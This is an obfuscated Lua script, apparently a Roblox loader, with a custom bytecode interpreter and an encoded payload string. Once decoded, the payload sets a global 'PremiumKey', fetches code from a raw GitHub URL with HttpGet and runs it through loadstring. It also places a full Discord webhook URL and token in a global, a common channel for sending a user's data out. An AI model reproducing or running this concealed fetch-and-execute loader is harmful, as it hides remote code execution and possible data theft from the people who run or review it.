do
	local v0 = 0;
	local v1;
	local v2;
	local v3;
	local v4;
	local v5;
	local v6;
	local v7;
	local v8;
	local v9;
	local v10;
	local v11;
	local v12;
	local v13;
	local v14;
	local v15;
	local v16;
	while true do
		if (v0 == 2) then
			v9 = math.ldexp;
			v10 = getfenv or function()
				return _ENV;
			end;
			v11 = setmetatable;
			v12 = pcall;
			v0 = 3;
		end
		if (v0 == 4) then
			v16 = function(v18, v19, ...)
				local v27 = 1;
				local v28;
				v18 = v5(v4(v18, 5), "..", function(v29)
					if (v2(v29, 2) == 79) then
						local v77 = 0;
						while true do
							if (v77 == 0) then
								v28 = v1(v4(v29, 1, 1));
								return "";
							end
						end
					else
						local v78 = v3(v1(v29, 16));
						if v28 then
							local v84 = 0;
							local v85;
							while true do
								if (v84 == 0) then
									v85 = v6(v78, v28);
									v28 = nil;
									v84 = 1;
								end
								if (v84 == 1) then
									return v85;
								end
							end
						else
							return v78;
						end
					end
				end);
				local function v30(v31, v32, v33)
					if v33 then
						local v79 = (v31 / ((3 - 1) ^ (v32 - 1))) % ((1664 - (1064 + 598)) ^ (((v33 - (1443 - (629 + 813))) - (v32 - ((2 - 1) + 0))) + (1778 - (1178 + 338 + 261))));
						return v79 - (v79 % 1);
					else
						local v80 = 2 ^ (v32 - (1684 - (1072 + 611)));
						return (((v31 % (v80 + v80)) >= v80) and (971 - (938 + 32))) or (0 - (691 - (679 + 12)));
					end
				end
				local function v34()
					local v47 = 0 - (730 - (170 + 560));
					local v48;
					while true do
						if (v47 == (981 - (567 + 413))) then
							return v48;
						end
						if (v47 == (217 - (71 + 146))) then
							v48 = v2(v18, v27, v27);
							v27 = v27 + 1;
							v47 = 1 + 0;
						end
					end
				end
				local function v35()
					local v49, v50 = v2(v18, v27, v27 + (322 - (279 + 41)));
					v27 = v27 + (2 - 0);
					return (v50 * 256) + v49;
				end
				local function v36()
					local v51, v52, v53, v54 = v2(v18, v27, v27 + (708 - (688 + 17)));
					v27 = v27 + (527 - (511 + 12));
					return (v54 * 16777216) + (v53 * (66787 - (725 + (700 - 174)))) + (v52 * (109 + 147)) + v51;
				end
				local function v37()
					local v55 = v36();
					local v56 = v36();
					local v57 = 1;
					local v58 = (v30(v56, 1 + 0, (23 + 48) - 51) * ((2 + (0 - 0)) ^ (6 + 26))) + v55;
					local v59 = v30(v56, 39 - 18, 1945 - (1738 + 176));
					local v60 = ((v30(v56, 714 - (127 + (917 - 362))) == (943 - (894 + 48))) and -(2 - 1)) or (1 + (1143 - (847 + 296)));
					if (v59 == (0 + 0)) then
						if (v58 == (0 + 0)) then
							return v60 * (0 - 0);
						else
							local v86 = 0 + 0;
							while true do
								if (((0 - 0) - 0) == v86) then
									v59 = 1 + 0;
									v57 = 0 + 0;
									break;
								end
							end
						end
					elseif (v59 == (7737 - (6048 - (347 + 11)))) then
						return ((v58 == 0) and (v60 * ((811 - (363 + 447)) / 0))) or (v60 * NaN);
					end
					return v9(v60, v59 - (39 + 984)) * (v57 + (v58 / ((7 - 5) ^ (11 + 41))));
				end
				local function v38(v39)
					local v61;
					if not v39 then
						v39 = v36();
						if (v39 == (470 - (4 + 466))) then
							return "";
						end
					end
					v61 = v4(v18, v27, (v27 + v39) - (1 - 0));
					v27 = v27 + v39;
					local v62 = {};
					for v75 = 1, #v61 do
						v62[v75] = v3(v2(v4(v61, v75, v75)));
					end
					return v7(v62);
				end
				local v40 = v36;
				local function v41(...)
					return {...}, v13("#", ...);
				end
				local function v42()
					local v63 = 0 + 0;
					local v64;
					local v65;
					local v66;
					local v67;
					local v68;
					local v69;
					local v70;
					while true do
						if (v63 ~= (2 + 1)) then
						else
							v70 = nil;
							while true do
								if (1 == v64) then
									local v102 = 1643 - (231 + 1412);
									local v103;
									while true do
										if (v102 == (0 + 0)) then
											v103 = 0 + 0;
											while true do
												if (v103 ~= (1731 - (647 + 1084))) then
												else
													v69 = v36();
													v70 = {};
													v103 = 1 - 0;
												end
												if (v103 ~= (1866 - (1171 + 694))) then
												else
													local v124 = 0;
													while true do
														if (0 == v124) then
															for v129 = 1, v69 do
																local v130 = 0 + 0;
																local v131;
																local v132;
																local v133;
																local v134;
																while true do
																	if (v130 == (0 + 0)) then
																		v131 = 0 + 0;
																		v132 = nil;
																		v130 = 2 - 1;
																	end
																	if (v130 ~= (1 + 0)) then
																	else
																		v133 = nil;
																		v134 = nil;
																		v130 = 3 - 1;
																	end
																	if (v130 == (5 - 3)) then
																		while true do
																			if (v131 ~= 0) then
																			else
																				local v169 = 1490 - (427 + 1063);
																				while true do
																					if (v169 ~= 1) then
																					else
																						v131 = 1;
																						break;
																					end
																					if (v169 == (0 - 0)) then
																						v132 = 198 - (57 + 141);
																						v133 = nil;
																						v169 = 2 - 1;
																					end
																				end
																			end
																			if (v131 ~= (2 - 1)) then
																			else
																				v134 = nil;
																				while true do
																					if ((2 - 1) == v132) then
																						if (v133 == (1 - 0)) then
																							v134 = v34() ~= (851 - (446 + 405));
																						elseif (v133 == (2 + 0)) then
																							v134 = v37();
																						elseif (v133 == (687 - (101 + 583))) then
																							v134 = v38();
																						end
																						v70[v129] = v134;
																						break;
																					end
																					if (v132 == 0) then
																						local v171 = 114 - (113 + 1);
																						while true do
																							if (v171 ~= (1 - 0)) then
																							else
																								v132 = 3 - 2;
																								break;
																							end
																							if ((643 - (155 + 488)) == v171) then
																								local v178 = 1933 - (818 + 1115);
																								while true do
																									if ((3 - 2) ~= v178) then
																									else
																										v171 = 1;
																										break;
																									end
																									if (v178 == (1767 - (633 + 1134))) then
																										v133 = v34();
																										v134 = nil;
																										v178 = 1;
																									end
																								end
																							end
																						end
																					end
																				end
																				break;
																			end
																		end
																		break;
																	end
																end
															end
															v68[111 - (27 + 81)] = v34();
															v124 = 1;
														end
														if (v124 ~= 1) then
														else
															v103 = 1904 - (176 + 1726);
															break;
														end
													end
												end
												if (v103 == 2) then
													v64 = 3 - 1;
													break;
												end
											end
											break;
										end
									end
								end
								if (v64 ~= (5 - 3)) then
								else
									local v104 = 0 - 0;
									while true do
										if (v104 ~= (1 + 0)) then
										else
											for v115 = 1218 - (431 + 786), v36() do
												v67[v115] = v36();
											end
											return v68;
										end
										if ((0 + 0) == v104) then
											for v117 = 885 - (629 + 255), v36() do
												local v118 = 583 - (190 + 393);
												local v119;
												local v120;
												local v121;
												while true do
													if (v118 ~= (2 - 1)) then
													else
														v121 = nil;
														while true do
															if (v119 == 0) then
																local v135 = 0 - 0;
																while true do
																	if (v135 == 0) then
																		v120 = 0;
																		v121 = nil;
																		v135 = 1;
																	end
																	if (v135 == 1) then
																		v119 = 1;
																		break;
																	end
																end
															end
															if (v119 ~= (954 - (153 + 800))) then
															else
																while true do
																	if (v120 ~= (1649 - (165 + 1484))) then
																	else
																		v121 = v34();
																		if (v30(v121, 2 - 1, 1) == (0 - 0)) then
																			local v158 = 0 + 0;
																			local v159;
																			local v160;
																			local v161;
																			local v162;
																			local v163;
																			while true do
																				if (v158 == 1) then
																					v161 = nil;
																					v162 = nil;
																					v158 = 2;
																				end
																				if (v158 == (2 + 0)) then
																					v163 = nil;
																					while true do
																						if (v159 == 0) then
																							v160 = 0 + 0;
																							v161 = nil;
																							v159 = 3 - 2;
																						end
																						if (v159 == (2 - 0)) then
																							while true do
																								if (v160 ~= (392 - (153 + 238))) then
																								else
																									local v179 = 0 - 0;
																									local v180;
																									local v181;
																									while true do
																										if (v179 == 0) then
																											v180 = 0 + 0;
																											v181 = nil;
																											v179 = 1;
																										end
																										if (v179 ~= (1 + 0)) then
																										else
																											while true do
																												if (v180 == 0) then
																													v181 = 0 + 0;
																													while true do
																														if (v181 == 1) then
																															v160 = 2 + 0;
																															break;
																														end
																														if (v181 == 0) then
																															local v196 = 0 + 0;
																															local v197;
																															while true do
																																if (v196 ~= (169 - (158 + 11))) then
																																else
																																	v197 = 0 - 0;
																																	while true do
																																		if (v197 ~= 1) then
																																		else
																																			v181 = 1;
																																			break;
																																		end
																																		if (v197 == (351 - (130 + 221))) then
																																			local v199 = 0 + 0;
																																			while true do
																																				if (v199 == (1 + 0)) then
																																					v197 = 758 - (322 + 435);
																																					break;
																																				end
																																				if (v199 == 0) then
																																					v163 = {v35(),v35(),nil,nil};
																																					if (v161 == 0) then
																																						local v200 = 0;
																																						local v201;
																																						local v202;
																																						while true do
																																							if ((418 - (46 + 371)) == v200) then
																																								while true do
																																									if ((0 - 0) == v201) then
																																										v202 = 792 - (198 + 594);
																																										while true do
																																											if (v202 ~= (0 + 0)) then
																																											else
																																												v163[934 - (472 + 459)] = v35();
																																												v163[4] = v35();
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																							if (v200 == 0) then
																																								v201 = 0;
																																								v202 = nil;
																																								v200 = 2 - 1;
																																							end
																																						end
																																					elseif (v161 == (1 + 0)) then
																																						v163[142 - (22 + 117)] = v36();
																																					elseif (v161 == 2) then
																																						v163[1 + 2] = v36() - (2 ^ (10 + 6));
																																					elseif (v161 == (1997 - (1217 + 777))) then
																																						local v205 = 1155 - (1069 + 86);
																																						local v206;
																																						local v207;
																																						local v208;
																																						while true do
																																							if (v205 ~= (1 + 0)) then
																																							else
																																								v208 = nil;
																																								while true do
																																									if (v206 ~= (0 + 0)) then
																																									else
																																										v207 = 0;
																																										v208 = nil;
																																										v206 = 1;
																																									end
																																									if (1 == v206) then
																																										while true do
																																											if (v207 ~= (0 + 0)) then
																																											else
																																												v208 = 0 + 0;
																																												while true do
																																													if (v208 == (473 - (210 + 263))) then
																																														v163[1 + 2] = v36() - ((3 - 1) ^ (10 + 6));
																																														v163[4] = v35();
																																														break;
																																													end
																																												end
																																												break;
																																											end
																																										end
																																										break;
																																									end
																																								end
																																								break;
																																							end
																																							if (v205 == (0 + 0)) then
																																								v206 = 1938 - (960 + 978);
																																								v207 = nil;
																																								v205 = 1826 - (502 + 1323);
																																							end
																																						end
																																					end
																																					v199 = 1;
																																				end
																																			end
																																		end
																																	end
																																	break;
																																end
																															end
																														end
																													end
																													break;
																												end
																											end
																											break;
																										end
																									end
																								end
																								if (v160 == (3 + 0)) then
																									if (v30(v162, 1183 - (39 + 1141), 5 - 2) ~= (2 - 1)) then
																									else
																										v163[932 - (436 + 492)] = v70[v163[8 - 4]];
																									end
																									v65[v117] = v163;
																									break;
																								end
																								if (v160 == (8 - 6)) then
																									local v183 = 0;
																									local v184;
																									while true do
																										if (v183 ~= (1347 - (1071 + 276))) then
																										else
																											v184 = 0;
																											while true do
																												if (v184 == (1 + 0)) then
																													v160 = 1897 - (1775 + 119);
																													break;
																												end
																												if (v184 == (0 + 0)) then
																													if (v30(v162, 1 + 0, 328 - (124 + 203)) == 1) then
																														v163[59 - (18 + 39)] = v70[v163[1924 - (156 + 1766)]];
																													end
																													if (v30(v162, 6 - 4, 2 + 0) == (3 - 2)) then
																														v163[3 + 0] = v70[v163[3]];
																													end
																													v184 = 1;
																												end
																											end
																											break;
																										end
																									end
																								end
																								if (v160 ~= (0 + 0)) then
																								else
																									local v185 = 0 + 0;
																									local v186;
																									local v187;
																									while true do
																										if (v185 == (1 + 0)) then
																											while true do
																												if (v186 == (0 - 0)) then
																													v187 = 1168 - (859 + 309);
																													while true do
																														if (v187 == (0 + 0)) then
																															local v198 = 0 + 0;
																															while true do
																																if (v198 ~= (40 - (30 + 9))) then
																																else
																																	v187 = 1402 - (753 + 648);
																																	break;
																																end
																																if (v198 ~= (0 + 0)) then
																																else
																																	v161 = v30(v121, 324 - (106 + 216), 2 + 1);
																																	v162 = v30(v121, 4, 1366 - (958 + 402));
																																	v198 = 1 + 0;
																																end
																															end
																														end
																														if (v187 == (102 - (70 + 31))) then
																															v160 = 837 - (480 + 356);
																															break;
																														end
																													end
																													break;
																												end
																											end
																											break;
																										end
																										if (v185 == (1757 - (1277 + 480))) then
																											v186 = 1631 - (1320 + 311);
																											v187 = nil;
																											v185 = 1 + 0;
																										end
																									end
																								end
																							end
																							break;
																						end
																						if (1 ~= v159) then
																						else
																							local v175 = 0 + 0;
																							while true do
																								if (v175 == 1) then
																									v159 = 2 + 0;
																									break;
																								end
																								if ((0 + 0) == v175) then
																									v162 = nil;
																									v163 = nil;
																									v175 = 2 - 1;
																								end
																							end
																						end
																					end
																					break;
																				end
																				if ((1420 - (788 + 632)) == v158) then
																					v159 = 0;
																					v160 = nil;
																					v158 = 1140 - (553 + 586);
																				end
																			end
																		end
																		break;
																	end
																end
																break;
															end
														end
														break;
													end
													if (v118 ~= (0 - 0)) then
													else
														v119 = 0 - 0;
														v120 = nil;
														v118 = 2 - 1;
													end
												end
											end
											for v122 = 2 - 1, v36() do
												v66[v122 - 1] = v42();
											end
											v104 = 1;
										end
									end
								end
								if (v64 ~= (1580 - (605 + 975))) then
								else
									local v105 = 1444 - (487 + 957);
									local v106;
									while true do
										if (v105 ~= (0 + 0)) then
										else
											v106 = 1323 - (712 + 611);
											while true do
												if (1 == v106) then
													local v125 = 346 - (328 + 18);
													while true do
														if ((1780 - (847 + 932)) == v125) then
															v106 = 612 - (407 + 203);
															break;
														end
														if (v125 ~= (0 - 0)) then
														else
															v67 = {};
															v68 = {v65,v66,nil,v67};
															v125 = 1084 - (66 + 1017);
														end
													end
												end
												if (v106 ~= (2 + 0)) then
												else
													v64 = 1336 - (506 + 829);
													break;
												end
												if (v106 == (1081 - (622 + 459))) then
													v65 = {};
													v66 = {};
													v106 = 2 - 1;
												end
											end
											break;
										end
									end
								end
							end
							break;
						end
						if ((0 + 0) ~= v63) then
						else
							v64 = 0;
							v65 = nil;
							v63 = 1 + 0;
						end
						if (v63 ~= 2) then
						else
							v68 = nil;
							v69 = nil;
							v63 = 3;
						end
						if (v63 == (732 - (66 + 665))) then
							v66 = nil;
							v67 = nil;
							v63 = 2;
						end
					end
				end
				local function v43(v44, v45, v46)
					local v71 = 0;
					local v72;
					local v73;
					local v74;
					while true do
						if (v71 == 0) then
							v72 = v44[1];
							v73 = v44[2];
							v71 = 1;
						end
						if (v71 == 1) then
							v74 = v44[3];
							return function(...)
								local v87 = 1;
								local v88 = -1;
								local v89 = {...};
								local v90 = v13("#", ...) - 1;
								local function v91()
									local v92 = v72;
									local v93 = v73;
									local v94 = v74;
									local v95 = v41;
									local v96 = {};
									local v97 = {};
									local v98 = {};
									for v107 = 0, v90 do
										if (((853 + 911) < (906 + 916)) and (v107 >= v94)) then
											v96[v107 - v94] = v89[v107 + (367 - (229 + (431 - 294)))];
										else
											v98[v107] = v89[v107 + 1];
										end
									end
									local v99 = (v90 - v94) + 1 + 0;
									local v100;
									local v101;
									while true do
										local v108 = (0 - 0) - 0;
										local v109;
										while true do
											if (((23 - (6 + 17)) == v108) or (((16786 - 7962) - 6099) <= ((3093 - (274 + 778)) - (34 + 255)))) then
												v109 = 0 + 0;
												while true do
													if (((0 + 0) == v109) or ((4493 + 371) < (4566 - (43 + 1347)))) then
														local v126 = 1939 - (545 + 1394);
														while true do
															if (((2393 - 1766) <= (9736 - 5965)) and (v126 == (0 + 0))) then
																local v128 = 0;
																while true do
																	if ((2102 < (8263 - 3806)) and (v128 == 0)) then
																		v100 = v92[v87];
																		v101 = v100[1];
																		v128 = 1 - 0;
																	end
																	if (((3281 - (5087 - 3116)) == (2580 - (151 + 1119))) and (v128 == (1 + 0))) then
																		v126 = 1;
																		break;
																	end
																end
															end
															if ((v126 == (1 + 0)) or ((225 + 919) >= (4456 - (307 + 1024)))) then
																v109 = 1 + 0;
																break;
															end
														end
													end
													if (((3039 - (436 + 203)) <= (15900 - 11373)) and ((1 - (0 - 0)) == v109)) then
														if (((10385 - (6289 - (363 + 227))) >= (1718 + 396)) and (v101 <= (4 + 0))) then
															if ((v101 <= (1 - 0)) or ((1466 + 350) > (8821 - 5805))) then
																if ((v101 > (990 - (832 + 158))) or ((118 + 55 + 3554) >= (3343 + 971))) then
																	v98[v100[4 - 2]]();
																else
																	v87 = v100[2 + 1];
																end
															elseif ((v101 <= 2) or ((7572 - 4512) >= (993 + 2189 + 633))) then
																local v139 = 0 + 0;
																local v140;
																local v141;
																while true do
																	if (((4277 - (1323 + 236)) < (1844 + 2174)) and (v139 == (0 + 0))) then
																		v140 = v100[1170 - (414 + 754)];
																		v141 = v98[v100[3]];
																		v139 = 2 - 1;
																	end
																	if ((v139 == (1754 - (527 + 1051 + 175))) or ((2561 - (61 + 219)) <= ((3305 - (919 + 21)) - (761 + 572)))) then
																		v98[v140 + 1] = v141;
																		v98[v140] = v141[v100[9 - 5]];
																		break;
																	end
																end
															elseif (((6873 - 3572) == (3148 + 153)) and (v101 == (2 + 1))) then
																local v144 = 0 - 0;
																local v145;
																local v146;
																while true do
																	if (((2841 - (145 + 142)) < (1146 + (6144 - 3376))) and (v144 == 0)) then
																		v145 = 0 + 0 + 0;
																		v146 = nil;
																		v144 = 1 - 0;
																	end
																	if (((4065 - (209 + 240)) < 3794) and (v144 == (1 + 0))) then
																		while true do
																			if (((0 - 0) == v145) or (1160 == 2076)) then
																				v146 = v100[2];
																				v98[v146] = v98[v146](v14(v98, v146 + 1 + 0, v88));
																				break;
																			end
																		end
																		break;
																	end
																end
															else
																local v147 = 0;
																local v148;
																local v149;
																local v150;
																local v151;
																local v152;
																while true do
																	if ((v147 == 1) or ((1800 + 814) >= (2045 + 2022))) then
																		v150 = nil;
																		v151 = nil;
																		v147 = 2;
																	end
																	if ((v147 == 2) or (1465 >= (9029 - 4444))) then
																		v152 = nil;
																		while true do
																			if (((1886 - (1683 + 201)) == v148) or ((1571 - (249 + 552)) > 4815)) then
																				for v176 = v149, v88 do
																					local v177 = 0 + 0;
																					while true do
																						if ((v177 == (369 - (56 + 313))) or ((8936 - 6587) >= (1947 + 2063))) then
																							v152 = v152 + (3 - 2);
																							v98[v176] = v150[v152];
																							break;
																						end
																					end
																				end
																				break;
																			end
																			if (((383 + 1807) < (1625 + 2978)) and (v148 == (1461 - (846 + 614)))) then
																				v88 = (v151 + v149) - (1 - 0);
																				v152 = 0;
																				v148 = 2 + 0;
																			end
																			if (((0 + (0 - 0)) == v148) or ((9689 - 4990) == (15570 - 11855))) then
																				v149 = v100[3 - 1];
																				v150, v151 = v95(v98[v149](v14(v98, v149 + (244 - (110 + 133)), v100[723 - (195 + 525)])));
																				v148 = 1 + 0;
																			end
																		end
																		break;
																	end
																	if (((20953 - 16628) < (2604 + 1686 + 485)) and ((595 - ((1539 - 982) + 38)) == v147)) then
																		v148 = 0 - 0;
																		v149 = nil;
																		v147 = 1;
																	end
																end
															end
														elseif ((4053 < (6723 - (922 + 1039))) and (v101 <= (1354 - (617 + 731)))) then
															if (((2069 + 1216) >= (3778 - (20 + (1099 - (85 + 29))))) and (v101 > (1 + 4))) then
																do
																	return;
																end
															elseif (((755 + 286) == (2619 - (309 + 1269))) and (v98[v100[2]] == v100[(372 - (257 + 111)) + 0])) then
																v87 = v87 + 1 + 0;
															else
																v87 = v100[7 - 4];
															end
														elseif ((((9576 - 6376) - (606 + (556 - 340))) >= (3746 - 2793)) and (v101 <= 7)) then
															v98[v100[5 - 3]] = v100[(2806 - (868 + 413)) - (423 + 1099)];
														elseif ((v101 > (417 - (310 + 99))) or ((1637 - (1240 + 265)) >= ((1536 + 253) - (226 + 359)))) then
															v98[v100[2]] = v46[v100[3 + 0]];
														else
															v98[v100[2]][v100[3]] = v100[4];
														end
														v87 = v87 + 1 + 0;
														break;
													end
												end
												break;
											end
										end
									end
								end
								A, B = v41(v12(v91));
								if not A[1] then
									local v110 = v44[4][v87] or "?";
									error("Script error at [" .. v110 .. "]:" .. A[2]);
								else
									return v14(A, 2, B);
								end
							end;
						end
					end
				end
				return v43(v42(), {}, v19)(...);
			end;
			v16("LOL!0D3O00028O00026O00F03F03023O005F47030A3O005072656D69756D4B6579030A3O0023332D5765744469636B030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403453O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4275726B696E6F4O362F4675636B41726F756E642D546573742F6D61696E2F282903063O00557365724944022O008000E77DED4103073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31303837383937363339383O3032312O30322F7377314E5A692D62706D64622O4843613768735472766177507455307163623366464E512D52792O416E4C3461646A30354B487558465F34784A354D357433446D44354600163O0012073O00013O0026053O000D0001000200044O000D0001001209000100033O003008000100040005001209000100063O001209000200073O002002000200020008001207000400094O0004000200044O000300013O00022O000100010001000100044O001500010026053O00010001000100044O00010001001209000100033O0030080001000A000B001209000100033O0030080001000C000D0012073O00023O00044O000100012O00063O00017O00163O00023O00043O00043O00053O00053O00063O00063O00063O00063O00063O00063O00063O00073O00093O00093O000A3O000A3O000B3O000B3O000C3O000D3O000F3O00", v10(), ...);
			break;
		end
		if (v0 == 3) then
			v13 = select;
			v14 = unpack or table.unpack;
			v15 = tonumber;
			v16 = nil;
			v0 = 4;
		end
		if (v0 == 1) then
			v5 = string.gsub;
			v6 = string.rep;
			v7 = table.concat;
			v8 = table.insert;
			v0 = 2;
		end
		if (v0 == 0) then
			v1 = tonumber;
			v2 = string.byte;
			v3 = string.char;
			v4 = string.sub;
			v0 = 1;
		end
	end
end
